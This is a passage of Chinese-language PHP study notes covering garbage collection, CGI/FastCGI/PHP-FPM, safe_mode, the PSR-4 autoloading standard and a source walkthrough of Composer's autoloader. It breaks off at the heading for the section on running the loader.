调用这些函数，与修改配置项来打开或关闭垃圾回收机制的效果是一样的。即使在可能根缓冲区还没满时， 也能强制执行周期回收。你能调用gc_collect_cycles()函数达到这个目的。这个函数将返回使用这个算法回收的周期数。

允许打开和关闭垃圾回收机制并且允许自主的初始化的原因，是由于你的应用程序的某部分可能是高时效性的。

在这种情况下，你可能不想使用垃圾回收机制。当然，对你的应用程序的某部分关闭垃圾回收机制，是在冒着可能内存泄漏的风险， 因为一些可能根也许存不进有限的根缓冲区。因此，就在你调用gc_disable()函数释放内存之前， 先调用gc_collect_cycles()函数可能比较明智。因为这将清除已存放在根缓冲区中的所有可能根， 然后在垃圾回收机制被关闭时，可留下空缓冲区以有更多空间存储可能根。

性能方面考虑的因素

在上一节我们已经简单的提到：回收可能根有细微的性能上影响，但这是把PHP 5.2与PHP 5.3比较时才有的。

尽管在PHP 5.2中，记录可能根相对于完全不记录可能根要慢些，而PHP 5.3中对 PHP run-time 的其他修改减少了这个性能损失。

这里主要有两个领域对性能有影响。第一个是内存占用空间的节省， 另一个是垃圾回收机制执行内存清理时的执行时间增加(run-time delay)。我们将研究这两个领域。

内存占用空间的节省

首先，实现垃圾回收机制的整个原因是为了，一旦先决条件满足，通过清理循环引用的变量来节省内存占用。

在PHP执行中，一旦根缓冲区满了或者调用gc_collect_cycles() 函数时，就会执行垃圾回收。

在下图中，显示了下面脚本分别在PHP 5.2 和 PHP 5.3环境下的内存占用情况，其中排除了脚本启动时PHP本身占用的基本内存。

### cgi、fastcgi、php-fpm

https://www.zhihu.com/question/30672017

cgi

早期的web server只可以处理简单的静态web文件， 但是随着技术的发展出现动态语言如PHP，Python。PHP语言交给PHP解析器进行处理， 但是处理之后如何和web server进行通信呢？

为了解决不同的语言处理器与web server之间的通讯，出现了CGI协议。

只要按照CGI协议编写程序，就可以实现与语言解析器与web server之间的通讯。

CGI协议虽然解决了语言解析器和seb server之间通讯的问题， 但是它的效率很低。因为web server每收到一个请求都会创建一个CGI进程， PHP解析器都会解析php.ini文件，初始化环境，请求结束的时候再关闭进程。

对于每一个创建的CGI进程都会执行这些操作。所以效率很低。

FastCGI
FastCGI是用来提高CGI性能的，FastCGI每次处理完请求之后不会关闭掉进程。

而是保留这个进程，使这个进程可以处理多个请求。

这样的话每个请求都不用再重新创建一个进程了。大大提升了处理效率。

PHP-FPM

PHP-FPM(FastCGI Process Manager：FastCGI进程管理器)是一个实现了Fastcgi的程序， 并且提供进程管理的功能。进程包括master进程和worker进程。master进程只有一个， 负责监听端口，接受来自web server的请求。worker进程一般会有多个， 每个进程中会嵌入一个PHP解析器，进程PHP代码的处理。

### php.ini中的safe_mode 影响

Warning

本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。###*

1)用户输入输出函数（fopen()file()require(),只能用于调用这些函数有相同脚本的拥有者）

2)创建新文件（限制用户只在该用户拥有目录下创建文件）

3)用户调用popen()systen()exec()等脚本，只有脚本处在safe_mode_exec_dir配置指令指定的目录中才可能

4)加强HTTP认证，认证脚本拥有者的UID的划入认证领域范围内，此外启用安全模式下，不会设置PHP_AUTH

5)mysql服务器所用的用户名必须与调用mysql_connect()的文件的拥有者用户名相同6)

受影响的函数变量以及配置命令达到40个

### PSR 是什么，PSR-1, 2, 4, 7
http://psr.phphub.org/

https://learnku.com/docs/psr

1. 概述

本 PSR 是关于由文件路径 自动载入 对应类的相关规范， 本规范是可互操作的，可以作为任一自动载入规范的补充，其中包括 PSR-0，此外， 本 PSR 还包括自动载入的类对应的文件存放路径规范。

关于「能愿动词」的使用

为了避免歧义，文档大量使用了「能愿动词」，对应的解释如下：

必须 (MUST)：绝对，严格遵循，请照做，无条件遵守；

一定不可 (MUST NOT)：禁令，严令禁止；

应该 (SHOULD) ：强烈建议这样做，但是不强求；

不该 (SHOULD NOT)：强烈不建议这样做，但是不强求；

可以 (MAY) 和 可选 (OPTIONAL) ：选择性高一点，在这个文档内，此词语使用较少；

参见：RFC 2119

2. 详细说明

此处的「类」泛指所有的「Class 类」、「接口」、「traits 可复用代码块」以及其它类似结构。

一个完整的类名需具有以下结构:

\<命名空间>(\<子命名空间>)*\<类名>

完整的类名 必须 要有一个顶级命名空间，被称为 "vendor namespace"；

完整的类名 可以 有一个或多个子命名空间；

完整的类名 必须 有一个最终的类名；

完整的类名中任意一部分中的下滑线都是没有特殊含义的；

完整的类名 可以 由任意大小写字母组成；

所有类名都 必须 是大小写敏感的。

当根据完整的类名载入相应的文件

完整的类名中，去掉最前面的命名空间分隔符，前面连续的一个或多个命名空间和子命名空间， 作为「命名空间前缀」，其必须与至少一个「文件基目录」相对应；

紧接命名空间前缀后的子命名空间 必须 与相应的「文件基目录」相匹配，其中的命名空间分隔符将作为目录分隔符。

末尾的类名 必须 与对应的以 .php 为后缀的文件同名。

自动加载器（autoloader）的实现 一定不可 抛出异常、一定不可 触发任一级别的错误信息以及 不应该 有返回值。

3. 例子

下表展示了符合规范完整类名、命名空间前缀和文件基目录所对应的文件路径。
完整类名	命名空间前缀	文件基目录	文件路径
\Acme\Log\Writer\File_Writer	Acme\Log\Writer	./acme-log-writer/lib/	./acme-log-writer/lib/File_Writer.php
\Aura\Web\Response\Status	Aura\Web	/path/to/aura-web/src/	/path/to/aura-web/src/Response/Status.php
\Symfony\Core\Request	Symfony\Core	./vendor/Symfony/Core/	./vendor/Symfony/Core/Request.php
\Zend\Acl	Zend	/usr/includes/Zend/	/usr/includes/Zend/Acl.php
关于本规范的实现，可参阅 相关实例。

注意：实例并 不 属于规范的一部分，且随时 会 有所变动。

### Autoload、Composer 原理 PSR-4 、原理
https://segmentfault.com/a/1190000014948542

https://laravel-china.org/topics/2081/psr-specification-psr-4-automatic-loading-specification

PHP 自5.3的版本之后，已经重焕新生， 命名空间、性状（trait）、闭包、接口、PSR 规范、 以及 composer 的出现已经让 PHP 变成了一门现代化的脚本语言。

PHP 的生态系统也一直在演进，而 composer 的出现更是彻底的改变了以往构建 PHP 应用的方式， 我们可以根据 PHP 的应用需求混合搭配最合适的 PHP 组件。当然这也得益于 PSR 规范的提出。

PHP 自动加载功能

PSR 规范

comoposer 的自动加载过程

composer 源码分析

一、PHP 自动加载功能

PHP 自动加载功能的由来

在 PHP 开发过程中，如果希望从外部引入一个 Class ，通常会使用 include 和 require 方法， 去把定义这个 Class 的文件包含进来。这个在小规模开发的时候，没什么大问题。

但在大型的开发项目中，使用这种方式会带来一些隐含的问题：如果一个 PHP 文件需要使用很多其它类， 那么就需要很多的 require/include 语句，这样有可能会 造成遗漏 或者 包含进不必要的类文件。

如果大量的文件都需要使用其它的类，那么要保证每个文件都包含正确的类文件肯定是一个噩梦， 况且 require或 incloud 的性能代价很大。

PHP5 为这个问题提供了一个解决方案，这就是 类的自动加载(autoload)机制。

autoload机制 可以使得 PHP 程序有可能在使用类时才自动包含类文件， 而不是一开始就将所有的类文件include进来，这种机制也称为 Lazy loading (惰性加载)。

总结起来，自动加载功能带来了几处优点：

使用类之前无需 include / require
使用类的时候才会 include / require 文件，实现了 lazy loading ，避免了 include / require 多余文件。
无需考虑引入 类的实际磁盘地址 ，实现了逻辑和实体文件的分离。
PHP 自动加载函数 __autoload()
从 PHP5 开始，当我们在使用一个类时，如果发现这个类没有加载，
就会自动运行 __autoload() 函数，这个函数是我们在程序中自定义的，
在这个函数中我们可以加载需要使用的类。下面是个简单的示例：
```
<?php
function __autoload($classname) {
        require_once ($classname . ".class.php");
}
```
在我们这个简单的例子中，我们直接将类名加上扩展名 .class.php 构成了类文件名，然后使用 require_once 将其加载。

从这个例子中，我们可以看出 __autoload 至少要做三件事情：

根据类名确定类文件名；
确定类文件所在的磁盘路径；
将类从磁盘文件中加载到系统中。
第三步最简单，只需要使用 include / require 即可。要实现第一步，第二步的功能，
必须在开发时约定类名与磁盘文件的映射方法，只有这样我们才能根据类名找到它对应的磁盘文件。
当有大量的类文件要包含的时候，我们只要确定相应的规则，然后在 __autoload() 函数中，
将类名与实际的磁盘文件对应起来，就可以实现 lazy loading 的效果 。
如果想详细的了解关于 autoload 自动加载的过程，可以查看手册资料：PHP autoload函数说明
__autoload() 函数存在的问题
如果在一个系统的实现中，如果需要使用很多其它的类库，这些类库可能是由不同的开发人员编写的， 
其类名与实际的磁盘文件的映射规则不尽相同。这时如果要实现类库文件的自动加载，
就必须 在 __autoload() 函数中将所有的映射规则全部实现，这样的话 __autoload() 函数有可能会非常复杂，
甚至无法实现。最后可能会导致 __autoload() 函数十分臃肿，这时即便能够实现，
也会给将来的维护和系统效率带来很大的负面影响。
那么问题出现在哪里呢？问题出现在 __autoload() 是全局函数只能定义一次 ，不够灵活，
所以所有的类名与文件名对应的逻辑规则都要在一个函数里面实现，造成这个函数的臃肿。
那么如何来解决这个问题呢？答案就是使用一个 __autoload调用堆栈 ，
不同的映射关系写到不同的 __autoload函数 中去，然后统一注册统一管理，这个就是 PHP5 引入的 SPL Autoload 。
SPL Autoload
SPL是 Standard PHP Library(标准PHP库)的缩写。它是 PHP5 引入的一个扩展标准库，
包括 spl autoload 相关的函数以及各种数据结构和迭代器的接口或类。
spl autoload 相关的函数具体可见 php中spl_autoload
```
<?php
// __autoload 函数
// function __autoload($class) {
//     include 'classes/' . $class . '.class.php';
// }


function my_autoloader($class) {
    include 'classes/' . $class . '.class.php';
}

spl_autoload_register('my_autoloader');

// 定义的 autoload 函数在 class 里

// 静态方法
class MyClass {
  public static function autoload($className) {
    // ...
  }
}

spl_autoload_register(array('MyClass', 'autoload'));

// 非静态方法
class MyClass {
  public function autoload($className) {
    // ...
  }
}

$instance = new MyClass();
spl_autoload_register(array($instance, 'autoload'));
```
spl_autoload_register() 就是我们上面所说的__autoload调用堆栈，我们可以向这个函数注册多个我们自己的 autoload() 函数， 当 PHP 找不到类名时，PHP就会调用这个堆栈，然后去调用自定义的 autoload() 函数， 实现自动加载功能。如果我们不向这个函数输入任何参数，那么就会默认注册 spl_autoload() 函数。

二、PSR 规范

与自动加载相关的规范是 PSR4，在说 PSR4 之前先介绍一下 PSR 标准。PSR 标准的发明和推出组织是：

PHP-FIG，它的网站是：www.php-fig.org。由几位开源框架的开发者成立于 2009 年，从那开始也选取了很多其他成员进来， 虽然不是 “官方” 组织，但也代表了社区中不小的一块。组织的目的在于：以最低程度的限制，来统一各个项目的编码规范， 避免各家自行发展的风格阻碍了程序员开发的困扰，于是大伙发明和总结了 PSR，PSR 是 PHP Standards Recommendation 的缩写， 截止到目前为止，总共有 14 套 PSR 规范，其中有 7 套PSR规范已通过表决并推出使用，分别是：

PSR-0 自动加载标准（已废弃，一些旧的第三方库还有在使用）

PSR-1 基础编码标准

PSR-2 编码风格向导

PSR-3 日志接口

PSR-4 自动加载的增强版，替换掉了 PSR-0

PSR-6 缓存接口规范

PSR-7 HTTP 消息接口规范

具体详细的规范标准可以查看PHP 标准规范

PSR4 标准

2013 年底，PHP-FIG 推出了第 5 个规范——PSR-4。

PSR-4 规范了如何指定文件路径从而自动加载类定义，同时规范了自动加载文件的位置。

1）一个完整的类名需具有以下结构：

\<命名空间>\<子命名空间>\<类名>

完整的类名必须要有一个顶级命名空间，被称为 "vendor namespace"；

完整的类名可以有一个或多个子命名空间；

完整的类名必须有一个最终的类名；

完整的类名中任意一部分中的下滑线都是没有特殊含义的；

完整的类名可以由任意大小写字母组成；

所有类名都必须是大小写敏感的。

2）根据完整的类名载入相应的文件

完整的类名中，去掉最前面的命名空间分隔符，前面连续的一个或多个命名空间和子命名空间， 作为「命名空间前缀」，其必须与至少一个「文件基目录」相对应；

紧接命名空间前缀后的子命名空间 必须 与相应的「文件基目录」相匹配，其中的命名空间分隔符将作为目录分隔符。

末尾的类名必须与对应的以 .php 为后缀的文件同名。

自动加载器（autoloader）的实现一定不可抛出异常、一定不可触发任一级别的错误信息以及不应该有返回值。

3) 例子

PSR-4风格

类名：ZendAbc 

命名空间前缀：Zend 

文件基目录：/usr/includes/Zend/ 

文件路径：/usr/includes/Zend/Abc.php

类名：SymfonyCoreRequest 

命名空间前缀：SymfonyCore 

文件基目录：./vendor/Symfony/Core/ 

文件路径：./vendor/Symfony/Core/Request.php

目录结构
```
-vendor/
| -vendor_name/
| | -package_name/
| | | -src/
| | | | -ClassName.php       # Vendor_Name\Package_Name\ClassName
| | | -tests/
| | | | -ClassNameTest.php   # Vendor_Name\Package_Name\ClassNameTest
```
Composer自动加载过程

Composer 做了哪些事情

你有一个项目依赖于若干个库。

其中一些库依赖于其他库。

你声明你所依赖的东西。

Composer 会找出哪个版本的包需要安装，并安装它们（将它们下载到你的项目中）。

例如，你正在创建一个项目，需要做一些单元测试。你决定使用 phpunit 。为了将它添加到你的项目中， 你所需要做的就是在 composer.json 文件里描述项目的依赖关系。
```
 {
   "require": {
     "phpunit/phpunit":"~6.0",
   }
 }
```
然后在 composer require 之后我们只要在项目里面直接 use phpunit 的类即可使用。

执行 composer require 时发生了什么 composer 会找到符合 PR4 规范的第三方库的源 将其加载到 vendor 目录下 初始化顶级域名的映射并写入到指定的文件里
```
（如：'PHPUnit\\Framework\\Assert' => __DIR__ . '/..' . '/phpunit/phpunit/src/Framework/Assert.php'）
```
写好一个 autoload 函数，并且注册到 spl_autoload_register()里 题外话：现在很多框架都已经帮我们写好了顶级域名映射了，我们只需要在框架里面新建文件， 在新建的文件中写好命名空间，就可以在任何地方 use 我们的命名空间了。

Composer 源码分析

下面我们通过对源码的分析来看看 composer 是如何实现 PSR4标准 的自动加载功能。

很多框架在初始化的时候都会引入 composer 来协助自动加载的， 以 Laravel 为例，它入口文件 index.php 第一句就是利用 composer 来实现自动加载功能。

启动
```
<?php
  define('LARAVEL_START', microtime(true));

  require __DIR__ . '/../vendor/autoload.php';
去 vendor 目录下的 autoload.php ：

<?php
  require_once __DIR__ . '/composer' . '/autoload_real.php';

  return ComposerAutoloaderInit7b790917ce8899df9af8ed53631a1c29::getLoader();
```
这里就是 Composer 真正开始的地方了

Composer自动加载文件

首先，我们先大致了解一下Composer自动加载所用到的源文件。

autoload_real.php: 自动加载功能的引导类。

composer 加载类的初始化(顶级命名空间与文件路径映射初始化)和注册(spl_autoload_register())。

ClassLoader.php : composer 加载类。

composer 自动加载功能的核心类。

autoload_static.php : 顶级命名空间初始化类，

用于给核心类初始化顶级命名空间。

autoload_classmap.php : 自动加载的最简单形式，有完整的命名空间和文件目录的映射；

autoload_files.php : 用于加载全局函数的文件，存放各个全局函数所在的文件路径名；

autoload_namespaces.php : 符合 PSR0 标准的自动加载文件，存放着顶级命名空间与文件的映射；

autoload_psr4.php : 符合 PSR4 标准的自动加载文件，存放着顶级命名空间与文件的映射；

autoload_real 引导类 在 vendor 目录下的 autoload.php 文件中我们可以看出， 程序主要调用了引导类的静态方法 getLoader() ，我们接着看看这个函数。
```
<?php
    public static function getLoader()
    {
      if (null !== self::$loader) {
          return self::$loader;
      }

      spl_autoload_register(
        array('ComposerAutoloaderInit7b790917ce8899df9af8ed53631a1c29', 'loadClassLoader'), true, true
      );

      self::$loader = $loader = new \Composer\Autoload\ClassLoader();

      spl_autoload_unregister(
        array('ComposerAutoloaderInit7b790917ce8899df9af8ed53631a1c29', 'loadClassLoader')
      );

      $useStaticLoader = PHP_VERSION_ID >= 50600 && !defined('HHVM_VERSION');

      if ($useStaticLoader) {
          require_once __DIR__ . '/autoload_static.php';

          call_user_func(
          \Composer\Autoload\ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::getInitializer($loader)
          );

      } else {
          $map = require __DIR__ . '/autoload_namespaces.php';
          foreach ($map as $namespace => $path) {
              $loader->set($namespace, $path);
          }

          $map = require __DIR__ . '/autoload_psr4.php';
          foreach ($map as $namespace => $path) {
              $loader->setPsr4($namespace, $path);
          }

          $classMap = require __DIR__ . '/autoload_classmap.php';
          if ($classMap) {
              $loader->addClassMap($classMap);
          }
      }

      /***********************注册自动加载核心类对象********************/
      $loader->register(true);

      /***********************自动加载全局函数********************/
      if ($useStaticLoader) {
          $includeFiles = Composer\Autoload\ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::$files;
      } else {
          $includeFiles = require __DIR__ . '/autoload_files.php';
      }

      foreach ($includeFiles as $fileIdentifier => $file) {
          composerRequire7b790917ce8899df9af8ed53631a1c29($fileIdentifier, $file);
      }

      return $loader;
    }
```
我把自动加载引导类分为 5 个部分。

第一部分——单例

第一部分很简单，就是个最经典的单例模式，自动加载类只能有一个。
```
<?php
  if (null !== self::$loader) {
      return self::$loader;
  }
```
第二部分——构造ClassLoader核心类

第二部分 new 一个自动加载的核心类对象。
```
<?php
  /***********************获得自动加载核心类对象********************/
  spl_autoload_register(
    array('ComposerAutoloaderInit7b790917ce8899df9af8ed53631a1c29', 'loadClassLoader'), true, true
  );

  self::$loader = $loader = new \Composer\Autoload\ClassLoader();

  spl_autoload_unregister(
    array('ComposerAutoloaderInit7b790917ce8899df9af8ed53631a1c29', 'loadClassLoader')
  );
loadClassLoader()函数：

<?php
public static function loadClassLoader($class)
{
    if ('Composer\Autoload\ClassLoader' === $class) {
        require __DIR__ . '/ClassLoader.php';
    }
}
```
从程序里面我们可以看出，composer 先向 PHP 自动加载机制注册了一个函数， 这个函数 require 了 ClassLoader 文件。成功 new 出该文件中核心类 ClassLoader() 后，又销毁了该函数。

第三部分 —— 初始化核心类对象
```
<?php
  /***********************初始化自动加载核心类对象********************/
  $useStaticLoader = PHP_VERSION_ID >= 50600 && !defined('HHVM_VERSION');
  if ($useStaticLoader) {
     require_once __DIR__ . '/autoload_static.php';

     call_user_func(
       \Composer\Autoload\ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::getInitializer($loader)
     );
  } else {
      $map = require __DIR__ . '/autoload_namespaces.php';
      foreach ($map as $namespace => $path) {
         $loader->set($namespace, $path);
      }

      $map = require __DIR__ . '/autoload_psr4.php';
      foreach ($map as $namespace => $path) {
         $loader->setPsr4($namespace, $path);
      }

      $classMap = require __DIR__ . '/autoload_classmap.php';
      if ($classMap) {
          $loader->addClassMap($classMap);
      }
    }
```
这一部分就是对自动加载类的初始化，主要是给自动加载核心类初始化顶级命名空间映射。

初始化的方法有两种：

1. 使用 autoload_static 进行静态初始化；
2. 调用核心类接口初始化。

autoload_static 静态初始化 ( PHP >= 5.6 )
静态初始化只支持 PHP5.6 以上版本并且不支持 HHVM 虚拟机。我们深入 autoload_static.php 这个文件发现这个文件定义了一个用于静态初始化的类， 名字叫 ComposerStaticInit7b790917ce8899df9af8ed53631a1c29，仍然为了避免冲突而加了 hash 值。这个类很简单：
```
<?php
  class ComposerStaticInit7b790917ce8899df9af8ed53631a1c29{
     public static $files = array(...);
     public static $prefixLengthsPsr4 = array(...);
     public static $prefixDirsPsr4 = array(...);
     public static $prefixesPsr0 = array(...);
     public static $classMap = array (...);

    public static function getInitializer(ClassLoader $loader)
    {
      return \Closure::bind(function () use ($loader) {
          $loader->prefixLengthsPsr4
                          = ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::$prefixLengthsPsr4;

          $loader->prefixDirsPsr4
                          = ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::$prefixDirsPsr4;

          $loader->prefixesPsr0
                          = ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::$prefixesPsr0;

          $loader->classMap
                          = ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::$classMap;

      }, null, ClassLoader::class);
  }
```
这个静态初始化类的核心就是 getInitializer() 函数，它将自己类中的顶级命名空间映射给了 ClassLoader 类。

值得注意的是这个函数返回的是一个匿名函数，为什么呢？原因就是 ClassLoader类 中的 prefixLengthsPsr4 、prefixDirsPsr4等等变量都是 private的。

利用匿名函数的绑定功能就可以将这些 private 变量赋给 ClassLoader 类 里的成员变量。

关于匿名函数的绑定功能。

接下来就是命名空间初始化的关键了。
```
classMap（命名空间映射）
<?php
  public static $classMap = array (
      'App\\Console\\Kernel'
              => __DIR__ . '/../..' . '/app/Console/Kernel.php',

      'App\\Exceptions\\Handler'
              => __DIR__ . '/../..' . '/app/Exceptions/Handler.php',

      'App\\Http\\Controllers\\Auth\\ForgotPasswordController'
              => __DIR__ . '/../..' . '/app/Http/Controllers/Auth/ForgotPasswordController.php',

      'App\\Http\\Controllers\\Auth\\LoginController'
              => __DIR__ . '/../..' . '/app/Http/Controllers/Auth/LoginController.php',

      'App\\Http\\Controllers\\Auth\\RegisterController'
              => __DIR__ . '/../..' . '/app/Http/Controllers/Auth/RegisterController.php',
  ...)
```
直接命名空间全名与目录的映射，简单粗暴，也导致这个数组相当的大。

PSR4 标准顶级命名空间映射数组：
```
<?php
  public static $prefixLengthsPsr4 = array(
      'p' => array (
        'phpDocumentor\\Reflection\\' => 25,
    ),
      'S' => array (
        'Symfony\\Polyfill\\Mbstring\\' => 26,
        'Symfony\\Component\\Yaml\\' => 23,
        'Symfony\\Component\\VarDumper\\' => 28,
        ...
    ),
  ...);

  public static $prefixDirsPsr4 = array (
      'phpDocumentor\\Reflection\\' => array (
        0 => __DIR__ . '/..' . '/phpdocumentor/reflection-common/src',
        1 => __DIR__ . '/..' . '/phpdocumentor/type-resolver/src',
        2 => __DIR__ . '/..' . '/phpdocumentor/reflection-docblock/src',
    ),
       'Symfony\\Polyfill\\Mbstring\\' => array (
        0 => __DIR__ . '/..' . '/symfony/polyfill-mbstring',
    ),
      'Symfony\\Component\\Yaml\\' => array (
        0 => __DIR__ . '/..' . '/symfony/yaml',
    ),
  ...)
```
PSR4 标准顶级命名空间映射用了两个数组，第一个是用命名空间第一个字母作为前缀索引， 然后是 顶级命名空间，但是最终并不是文件路径，而是 顶级命名空间的长度。为什么呢？

因为 PSR4 标准是用顶级命名空间目录替换顶级命名空间，所以获得顶级命名空间的长度很重要。

具体说明这些数组的作用：

假如我们找 Symfony\Polyfill\Mbstring\example 这个命名空间，通过前缀索引和字符串匹配我们得到了
```
<?php
    'Symfony\\Polyfill\\Mbstring\\' => 26,
```
这条记录，键是顶级命名空间，值是命名空间的长度。

拿到顶级命名空间后去 $prefixDirsPsr4数组 获取它的映射目录数组：(注意映射目录可能不止一条)
```
<?php
  'Symfony\\Polyfill\\Mbstring\\' => array (
              0 => __DIR__ . '/..' . '/symfony/polyfill-mbstring',
          )
```
然后我们就可以将命名空间 Symfony\\Polyfill\\Mbstring\\example 前26个字符 替换成目录 __DIR__ . '/..' . '/symfony/polyfill-mbstring ， 我们就得到了__DIR__ . '/..' . '/symfony/polyfill-mbstring/example.php， 先验证磁盘上这个文件是否存在，如果不存在接着遍历。如果遍历后没有找到，则加载失败。

ClassLoader 接口初始化（ PHP < 5.6 ）

如果PHP版本低于 5.6 或者使用 HHVM 虚拟机环境，那么就要使用核心类的接口进行初始化。
```
<?php
    // PSR0 标准
    $map = require __DIR__ . '/autoload_namespaces.php';
    foreach ($map as $namespace => $path) {
       $loader->set($namespace, $path);
    }

    // PSR4 标准
    $map = require __DIR__ . '/autoload_psr4.php';
    foreach ($map as $namespace => $path) {
       $loader->setPsr4($namespace, $path);
    }

    $classMap = require __DIR__ . '/autoload_classmap.php';
    if ($classMap) {
       $loader->addClassMap($classMap);
    }
```
PSR4 标准的映射

autoload_psr4.php 的顶级命名空间映射
```
<?php
    return array(
    'XdgBaseDir\\'
        => array($vendorDir . '/dnoegel/php-xdg-base-dir/src'),

    'Webmozart\\Assert\\'
        => array($vendorDir . '/webmozart/assert/src'),

    'TijsVerkoyen\\CssToInlineStyles\\'
        => array($vendorDir . '/tijsverkoyen/css-to-inline-styles/src'),

    'Tests\\'
        => array($baseDir . '/tests'),

    'Symfony\\Polyfill\\Mbstring\\'
        => array($vendorDir . '/symfony/polyfill-mbstring'),
    ...
    )
PSR4 标准的初始化接口:

<?php
    public function setPsr4($prefix, $paths)
    {
        if (!$prefix) {
            $this->fallbackDirsPsr4 = (array) $paths;
        } else {
            $length = strlen($prefix);
            if ('\\' !== $prefix[$length - 1]) {
                throw new \InvalidArgumentException(
                  "A non-empty PSR-4 prefix must end with a namespace separator."
                );
            }
            $this->prefixLengthsPsr4[$prefix[0]][$prefix] = $length;
            $this->prefixDirsPsr4[$prefix] = (array) $paths;
        }
    }
```
总结下上面的顶级命名空间映射过程：

( 前缀 -> 顶级命名空间，顶级命名空间 -> 顶级命名空间长度 )

( 顶级命名空间 -> 目录 )

这两个映射数组。具体形式也可以查看下面的 autoload_static 的 、prefixDirsPsr4 。

命名空间映射
autoload_classmap：
```
<?php
public static $classMap = array (
    'App\\Console\\Kernel'
        => __DIR__ . '/../..' . '/app/Console/Kernel.php',

    'App\\Exceptions\\Handler'
        => __DIR__ . '/../..' . '/app/Exceptions/Handler.php',
    ...
)
addClassMap:

<?php
    public function addClassMap(array $classMap)
    {
        if ($this->classMap) {
            $this->classMap = array_merge($this->classMap, $classMap);
        } else {
            $this->classMap = $classMap;
        }
    }
```
自动加载核心类 ClassLoader 的静态初始化到这里就完成了！

其实说是5部分，真正重要的就两部分——初始化与注册。初始化负责顶层命名空间的目录映射，注册负责实现顶层以下的命名空间映射规则。

第四部分 —— 注册

讲完了 Composer 自动加载功能的启动与初始化，经过启动与初始化， 自动加载核心类对象已经获得了顶级命名空间与相应目录的映射，也就是说， 如果有命名空间 'App\Console\Kernel，我们已经可以找到它对应的类文件所在位置。那么，它是什么时候被触发去找的呢？

这就是 composer 自动加载的核心了，我们先回顾一下自动加载引导类：
```
 public static function getLoader()
 {
    /***************************经典单例模式********************/
    if (null !== self::$loader) {
        return self::$loader;
    }
    
    /***********************获得自动加载核心类对象********************/
    spl_autoload_register(array('ComposerAutoloaderInit
    7b790917ce8899df9af8ed53631a1c29', 'loadClassLoader'), true, true);
    
    self::$loader = $loader = new \Composer\Autoload\ClassLoader();
    
    spl_autoload_unregister(array('ComposerAutoloaderInit
    7b790917ce8899df9af8ed53631a1c29', 'loadClassLoader'));

    /***********************初始化自动加载核心类对象********************/
    $useStaticLoader = PHP_VERSION_ID >= 50600 && 
    !defined('HHVM_VERSION');
    
    if ($useStaticLoader) {
        require_once __DIR__ . '/autoload_static.php';

        call_user_func(\Composer\Autoload\ComposerStaticInit
        7b790917ce8899df9af8ed53631a1c29::getInitializer($loader));
  
    } else {
        $map = require __DIR__ . '/autoload_namespaces.php';
        foreach ($map as $namespace => $path) {
            $loader->set($namespace, $path);
        }

        $map = require __DIR__ . '/autoload_psr4.php';
        foreach ($map as $namespace => $path) {
            $loader->setPsr4($namespace, $path);
        }

        $classMap = require __DIR__ . '/autoload_classmap.php';
        if ($classMap) {
            $loader->addClassMap($classMap);
        }
    }

    /***********************注册自动加载核心类对象********************/
    $loader->register(true);

    /***********************自动加载全局函数********************/
    if ($useStaticLoader) {
        $includeFiles = Composer\Autoload\ComposerStaticInit
        7b790917ce8899df9af8ed53631a1c29::$files;
    } else {
        $includeFiles = require __DIR__ . '/autoload_files.php';
    }
    
    foreach ($includeFiles as $fileIdentifier => $file) {
        composerRequire
        7b790917ce8899df9af8ed53631a1c29($fileIdentifier, $file);
    }

    return $loader;
} 
```
现在我们开始引导类的第四部分：注册自动加载核心类对象。我们来看看核心类的 register() 函数：
```
public function register($prepend = false)
{
    spl_autoload_register(array($this, 'loadClass'), true, $prepend);
}
```
其实奥秘都在自动加载核心类 ClassLoader 的 loadClass() 函数上：
```
public function loadClass($class)
    {
        if ($file = $this->findFile($class)) {
            includeFile($file);

            return true;
        }
    }
```
这个函数负责按照 PSR 标准将顶层命名空间以下的内容转为对应的目录， 也就是上面所说的将 'App\Console\Kernel 中' Console\Kernel 这一段转为目录， 至于怎么转的在下面 “运行”的部分讲。核心类 ClassLoader 将 loadClass() 函数注册到PHP SPL中的 spl_autoload_register() 里面去。

这样，每当PHP遇到一个不认识的命名空间的时候，PHP会自动调用注册到 spl_autoload_register 里面的 loadClass() 函数，然后找到命名空间对应的文件。

全局函数的自动加载

Composer 不止可以自动加载命名空间，还可以加载全局函数。怎么实现的呢？把全局函数写到特定的文件里面去， 在程序运行前挨个 require就行了。这个就是 composer 自动加载的第五步，加载全局函数。
```
if ($useStaticLoader) {
    $includeFiles = Composer\Autoload\ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::$files;
} else {
    $includeFiles = require __DIR__ . '/autoload_files.php';
}
foreach ($includeFiles as $fileIdentifier => $file) {
    composerRequire7b790917ce8899df9af8ed53631a1c29($fileIdentifier, $file);
}
```
跟核心类的初始化一样，全局函数自动加载也分为两种：静态初始化和普通初始化，静态加载只支持PHP5.6以上并且不支持HHVM。

静态初始化：
ComposerStaticInit7b790917ce8899df9af8ed53631a1c29::$files：
```
public static $files = array (
'0e6d7bf4a5811bfa5cf40c5ccd6fae6a' => __DIR__ . '/..' . '/symfony/polyfill-mbstring/bootstrap.php',
'667aeda72477189d0494fecd327c3641' => __DIR__ . '/..' . '/symfony/var-dumper/Resources/functions/dump.php',
...
);
```
普通初始化
autoload_files:
```
$vendorDir = dirname(dirname(__FILE__));
$baseDir = dirname($vendorDir);
    
return array(
'0e6d7bf4a5811bfa5cf40c5ccd6fae6a' => $vendorDir . '/symfony/polyfill-mbstring/bootstrap.php',
'667aeda72477189d0494fecd327c3641' => $vendorDir . '/symfony/var-dumper/Resources/functions/dump.php',
   ....
);
```
其实跟静态初始化区别不大。

加载全局函数
```
class ComposerAutoloaderInit7b790917ce8899df9af8ed53631a1c29{
  public static function getLoader(){
      ...
      foreach ($includeFiles as $fileIdentifier => $file) {
        composerRequire7b790917ce8899df9af8ed53631a1c29($fileIdentifier, $file);
      }
      ...
  }
}

function composerRequire7b790917ce8899df9af8ed53631a1c29($fileIdentifier, $file)
 {
    if (empty(\$GLOBALS['__composer_autoload_files'][\$fileIdentifier])) {
        require $file;

        $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;
    }
}
```
第五部分 —— 运行

